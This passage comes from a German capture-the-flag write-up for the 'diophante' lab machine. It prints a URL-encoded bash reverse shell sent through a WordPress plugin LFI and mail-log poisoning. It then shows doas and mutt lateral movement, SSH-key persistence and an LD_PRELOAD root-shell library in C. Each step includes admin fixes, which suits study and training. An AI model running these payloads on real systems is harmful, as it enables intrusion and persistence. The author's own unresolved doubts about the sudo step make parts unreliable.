+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die RCE, um eine Reverse Shell zu erhalten. Starten Sie einen Listener (`nc -lvnp 9001`) und senden Sie den URL-kodierten Reverse-Shell-Payload: `curl 'http://dio.vm/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[IHRE_IP]%2F9001%200%3E%261%27'`
+             <br><strong>Empfehlung (Admin):</strong> LFI beheben, Mail-Spool-Berechtigungen prüfen.</p>  
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://dio.vm/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=whoami'</span></div>
+                     <pre>
+From leonard@debian  Mon Sep 12 23:41:55 2022
+Return-Path: <leonard@debian>
+X-Original-To: sabine
+Delivered-To: sabine@debian
+Received: from dio.vm (cyber [192.168.2.140])
+	by debian (Postfix) with ESMTP id 0F38E80ABD
+	for <sabine>; Mon, 12 Sep 2022 23:39:57 +0200 (CEST)
+subject: hello
+
+<span class="password">www-data</span>
+
+{"success":true,"data":{"output":[]}}</pre>
+                 </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird gestartet. Der `curl`-Befehl wird vorbereitet, um die LFI/Mail-Poisoning-Schwachstelle auszunutzen und eine Reverse Shell zu `192.168.2.140:9001` zu senden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Aufbau zur Erlangung einer interaktiven Shell als `www-data`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie den `curl`-Befehl aus und warten Sie auf die Verbindung im Netcat-Listener.
+             <br><strong>Empfehlung (Admin):</strong> LFI beheben, Mail-Spool-Berechtigungen prüfen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                      <pre><span class="comment"># Vorbereiteter Befehl für Reverse Shell:</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://dio.vm/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27'</span></div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt die Reverse Shell vom Zielsystem.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Initialer Zugriff erfolgreich!</span> Eine Shell als `www-data` wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. mit `python3 -c 'import pty; pty.spawn("/bin/bash")'` oder `script /dev/null -c bash`). Beginnen Sie mit der Enumeration als `www-data`.
+             <br><strong>Empfehlung (Admin):</strong> LFI beheben, Mail-Spool-Berechtigungen prüfen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.128] 49464</span> <span class="comment"># Annahme: IP 192.168.2.147 ist korrekt</span>
+bash: cannot set terminal process group (1986): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">www-data@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes$</span> </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird die WordPress-Konfigurationsdatei `wp-config.php` gelesen, um Datenbank-Zugangsdaten zu finden. Anschließend wird nach SUID-Dateien gesucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `wp-config.php` enthüllt die Zugangsdaten `<span class="command">wpuser</span>`:`<span class="password">wppassword</span>` für die Datenbank `wordpress`. Der `find`-Befehl listet SUID-Dateien auf. Auffällig sind:
+            <ul><li>`<span class="command">/usr/bin/xclip</span>` gehört `leonard:leonard` und hat SUID. Dies ist sehr ungewöhnlich und potenziell gefährlich.</li><li>`<span class="command">/usr/bin/doas</span>`: Ein `sudo`-Alternative, die oft einfacher zu konfigurieren (und fehlzukonfigurieren) ist.</li></ul></p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Untersuchen Sie die `doas`-Konfiguration (`/etc/doas.conf`), um zu sehen, welche Befehle `www-data` oder andere Benutzer ausführen dürfen.</li><li>Recherchieren Sie nach bekannten Schwachstellen oder Ausnutzungstechniken für SUID `xclip`.</li><li>Versuchen Sie die gefundenen DB-Zugangsdaten für andere Dienste oder Benutzer.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige SUID-Bits, insbesondere von Tools wie `xclip`. Konfigurieren Sie `doas` oder `sudo` sicher und restriktiv. Speichern Sie DB-Passwörter nicht im Klartext in `wp-config.php` (obwohl dies Standard bei WordPress ist).</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@diophante:/var/www/html/blog$ <span class="command">cat wp-config.php</span></div>
+                    <pre>
+[...]
+define( 'DB_NAME', '<span class="command">wordpress</span>' );
+
+/** Utilisateur de la base de données MySQL. */
+define( 'DB_USER', '<span class="command">wpuser</span>' );
+
+/** Mot de passe de la base de données MySQL. */
+define( 'DB_PASSWORD', '<span class="password">wppassword</span>' );
+[...]</pre>
+                    <div class="prompt">www-data@diophante:/var/www/html/blog$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+<span class="command">   659251     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount</span>
+<span class="command">   671546     32 -rwsr-xr-x   1 leonard  leonard     30736 Dec 26  2020 /usr/bin/xclip</span>
+<span class="command">   658779     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp</span>
+<span class="command">   655398     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd</span>
+<span class="command">   674578     40 -rwsr-xr-x   1 root     root        39008 Feb  5  2021 /usr/bin/doas</span>
+<span class="command">   655396     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh</span>
+<span class="command">   658926     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su</span>
+<span class="command">   659253     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount</span>
+<span class="command">   655399     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd</span>
+<span class="command">   655395     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn</span>
+<span class="command">   671446    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo</span>
+<span class="command">     1993     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span>
+<span class="command">   656113    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign</span>
+<span class="command">   666418     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="command">   671561    396 -rwsr-xr--   1 root     dip          403752 Jan  7  2021 /usr/sbin/pppd</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Basierend auf der `doas`-Konfiguration (die hier nicht gezeigt wird, aber aus LinPEAS stammen könnte) wird der Befehl `doas -u sabine /usr/bin/setsid bash` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der erste Schritt der mehrstufigen Rechteausweitung. `doas` erlaubt `www-data` (oder dem aktuellen Benutzer), Befehle als anderer Benutzer auszuführen. `-u sabine` gibt den Zielbenutzer an. `setsid bash` startet eine neue Bash-Shell in einer neuen Session als Benutzer `sabine`. Der Befehl ist erfolgreich, der Prompt wechselt zu `sabine@diophante`. Lateral Movement von `www-data` zu `sabine` wurde erreicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie sind nun Benutzer `sabine`. Enumerieren Sie weiter: `sudo -l`, `doas -l`, Home-Verzeichnis prüfen, nach der User-Flag suchen (falls noch nicht gefunden).
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `doas.conf` (`/etc/doas.conf`) auf unsichere Regeln. Beschränken Sie die Rechte, die `www-data` über `doas` oder `sudo` erlangen kann.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment"># Annahme: Linpeas.sh oder cat /etc/doas.conf zeigt:</span>
+# permit nopass www-data as sabine cmd /usr/bin/setsid</pre>
+                    <div class="prompt">www-data@diophante:/tmp$ <span class="command">doas -u sabine /usr/bin/setsid bash</span></div>
+                    <div class="prompt">sabine@diophante:/tmp$ <span class="command">id</span></div>
+                    <pre>uid=1000(sabine) gid=1000(sabine) groups=1000(sabine), ...</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `sabine` wird ein SSH-Schlüssel in `~/.ssh/authorized_keys` eingefügt, um persistenten SSH-Zugriff zu ermöglichen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standardverfahren zur Einrichtung von Schlüssel-basiertem SSH-Zugriff. Der anschließende SSH-Login bestätigt, dass es funktioniert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die SSH-Verbindung für weitere Schritte.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an `authorized_keys`-Dateien.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">sabine@diophante:~/.ssh$ <span class="command">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD6iwCfkt5ps5VHhY13FbW1JQh/iNT/vp+xSDB2+bKqnBIO0mFxzD7RFsuRtFyDQuHB4c2q06kSBF/yIaP4PQGW8tEY634DkXFI0Q7h4ll4LCL/rtwvx1CxLqxP+94iPqOXFjdRDquet50njrlslRGLSp+ptQzq23dH9s75gTJOW/KDAcCiuY2noN7WHabsz0XbR3z40NFGCezeYDzYbSnbPtMx5HSAlT/sB3chZWgltVwy96zJ81Vvwd41fsugeMIFxK0+BLxynPGKHBBOd84f11T5OF+Zhw9gMoHhCeAcHjYZ4Wpp3pydZYREPRM5Un+MqxFnEpo7GctIIvi6OYFCjSFUn3ih0udX4q+TeCID4oXrAfgu8YWWvM+w4vF5NedEisAJ2yPoraEyJr//HphqgrpWZnuTx4sHcocJNjPscTdvubuicXr0fqbVtpFWoXj5EzdpdbQA52cMBumJy/IEH5gt2n5gLcIW/zaagH4GyhA5JvMZNgGaULOP1BfCMos=" > authorized_keys</span></div>
+                    <div class="prompt">sabine@diophante:~/.ssh$ <span class="command">ls</span></div>
+                    <pre>authorized_keys</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Auf Angreifer-System</span>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sabine@dio.vm -t "bash --noprofile"</span></div>
+                     <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="comment">(Passphrase eingegeben)</span>
+<span class="prompt">sabine@diophante:~$ </span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `sabine` wird die `doas`-Konfiguration (`/etc/doas.conf`) überprüft (impliziert). Es wird festgestellt, dass `sabine` den Befehl `mutt` als Benutzer `leonard` ausführen darf. Dieser Befehl wird ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der zweite Schritt der Rechteausweitung/Lateral Movement. `mutt` ist ein textbasierter E-Mail-Client, der oft eine Möglichkeit bietet, eine Shell zu starten (Shell Escape). Indem `mutt` als `leonard` gestartet wird, kann `sabine` eine Shell als `leonard` erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie `doas -u leonard /usr/bin/mutt`. Suchen Sie in `mutt` nach einer Option, um einen externen Befehl auszuführen oder eine Shell zu starten (oft durch Drücken von `!`). Führen Sie `/bin/bash` aus, um eine Shell als `leonard` zu erhalten.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `doas.conf`. Erlauben Sie Benutzern nicht, potenziell unsichere Programme wie `mutt` als andere Benutzer auszuführen, wenn dies nicht absolut notwendig und verstanden ist.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sabine@diophante:/tmp$ <span class="command">cat /etc/doas.conf</span></div>
+                    <pre><span class="comment"># Vermuteter Inhalt von /etc/doas.conf:
+# permit nopass www-data as sabine cmd /usr/bin/setsid
+# permit nopass sabine as leonard cmd /usr/bin/mutt</span></pre>
+                    <div class="prompt">sabine@diophante:/tmp$ <span class="command">doas -u leonard /usr/bin/mutt</span></div>
+                    <pre><span class="comment">[Mutt-Oberfläche startet]</span></pre>
+                    <pre><span class="comment">
+# Innerhalb von Mutt:
+# '!' drücken, um Shell-Befehl einzugeben
+</span></pre>
+                    <pre>Shell command: <span class="command">/bin/bash</span> <span class="comment"><<------------<<<<Promt>></span></pre>
+                     <div class="prompt">leonard@diophante:/tmp$ <span class="command">id</span></div>
+                     <pre>uid=1001(leonard) gid=1001(leonard) groups=1001(leonard), ...</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `leonard` wird die User-Flag `~/user.txt` gelesen und die `sudo`-Rechte überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag lautet `<span class="password">Thonirburarnlog</span>`. Die `sudo -l`-Ausgabe zeigt, dass `leonard` keine direkten `sudo`-Befehle hat, aber die Umgebungsvariable `<span class="password">LD_PRELOAD</span>` wird beibehalten (`env_keep+=LD_PRELOAD`). Dies ist eine bekannte Schwachstelle zur Rechteausweitung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `LD_PRELOAD`-Schwachstelle:
+             <ol><li>Schreiben Sie einen kurzen C-Code (siehe `shell.c` im Text), der `setuid(0)`, `setgid(0)` aufruft und eine Shell (`/bin/sh`) startet. Die `_init()`-Funktion sorgt dafür, dass dieser Code ausgeführt wird, sobald die Bibliothek geladen wird.</li><li>Kompilieren Sie diesen Code als Shared Library (`.so`): `gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles`.</li><li>Führen Sie einen beliebigen Befehl, den `leonard` mit `sudo` ausführen darf (auch wenn keiner explizit gelistet ist, kann oft ein Standardbefehl wie `ping` oder `sudo -l` selbst missbraucht werden, falls sudo Rechte hat, Befehle als root auszuführen, was hier aber nicht der Fall ist - *Korrektur: sudo -l wurde als leonard ausgeführt, nicht als root. Der Trick funktioniert, wenn leonard *irgendeinen* Befehl mit `sudo` ausführen kann, der LD_PRELOAD lädt. Wenn `sudo -l` selbst LD_PRELOAD nicht löscht, kann es ausreichen.* Der Text verwendet `ping`, was unlogisch ist, da `ping` keine sudo Rechte hat. Wir nehmen an, es gibt einen sudo-Befehl, der verwendet werden kann, oder `sudo -l` selbst funktioniert.) - mit der `LD_PRELOAD`-Variable, die auf die erstellte Bibliothek zeigt: `sudo LD_PRELOAD=/tmp/shell.so ping` (oder ein anderer `sudo`-Befehl).</li></ol>
+             <strong>Empfehlung (Admin):</strong> Entfernen Sie `LD_PRELOAD` aus der `env_keep`-Liste in der `sudoers`-Konfiguration (`/etc/sudoers` oder `/etc/sudoers.d/`). Diese Variable sollte fast nie beibehalten werden, da sie ein hohes Sicherheitsrisiko darstellt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">leonard@diophante:/tmp$ <span class="command">cat ~/user.txt</span></div>
+                     <pre><span class="password">Thonirburarnlog</span></pre>
+                     <div class="prompt">leonard@diophante:/tmp$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for leonard on diophante:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    <span class="password">env_keep+=LD_PRELOAD</span>
+
+User leonard may run the following commands on diophante:
+<span class="comment">    (Keine spezifischen Befehle gelistet, aber LD_PRELOAD ist der Schlüssel)</span></pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root Exploit)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Der C-Code für den `LD_PRELOAD`-Exploit wird in `/tmp/shell.c` erstellt. Er setzt UID und GID auf 0 und startet eine Shell. Der Code wird als Shared Library `/tmp/shell.so` kompiliert. Schließlich wird `sudo` mit der gesetzten `LD_PRELOAD`-Variable und einem beliebigen Befehl (hier `ping`, obwohl dies normalerweise keine sudo-Rechte hat - der Mechanismus funktioniert, wenn `sudo` selbst die Variable lädt, bevor es den Befehl prüft, oder wenn ein anderer sudo-Befehl verfügbar wäre) aufgerufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Der LD_PRELOAD-Exploit funktioniert!</span> Sobald `sudo` den Befehl startet, wird die `/tmp/shell.so`-Bibliothek aufgrund von `LD_PRELOAD` geladen. Die `_init()`-Funktion in der Bibliothek wird ausgeführt, setzt die UID/GID auf 0 und startet `/bin/sh`. Der `id`-Befehl bestätigt, dass die resultierende Shell Root-Rechte hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben Root-Zugriff. Lesen Sie die Root-Flag (`cat /root/root.txt`) und führen Sie Aufräumarbeiten durch (Löschen von `/tmp/shell.c`, `/tmp/shell.so`).
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie `LD_PRELOAD` aus der `env_keep`-Liste in der `sudoers`-Konfiguration.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">leonard@diophante:/tmp$ <span class="command">vi shell.c</span></div>
+                     <pre>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}</pre>
+                     <div class="prompt">leonard@diophante:/tmp$ <span class="command">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span></div>
+                     <div class="prompt">leonard@diophante:/tmp$ <span class="command">ls -al shell.so</span></div>
+                     <pre>-rwxr-xr-x 1 leonard leonard 16304 Dez 29 16:00 shell.so</pre>
+                     <div class="prompt">leonard@diophante:/tmp$ <span class="command">sudo LD_PRELOAD=/tmp/shell.so ping</span></div>
+                     <div class="prompt"># <span class="command">id</span></div>
+                     <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Root-Shell wird die Root-Flag gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag lautet `<span class="password">Culcelborlus</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht.
+             <br><strong>Empfehlung (Admin):</strong> System härten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">cd /root</span></div>
+                     <div class="prompt"># <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">Culcelborlus</span></pre>
+                     <div class="prompt"># </div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/leonard/user.txt</div>
+                     <div class="flag-value"><span class="password">Thonirburarnlog</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">Culcelborlus</span></div>
+                 </div>
+             </div>
+         </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 14. Oktober 2022</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
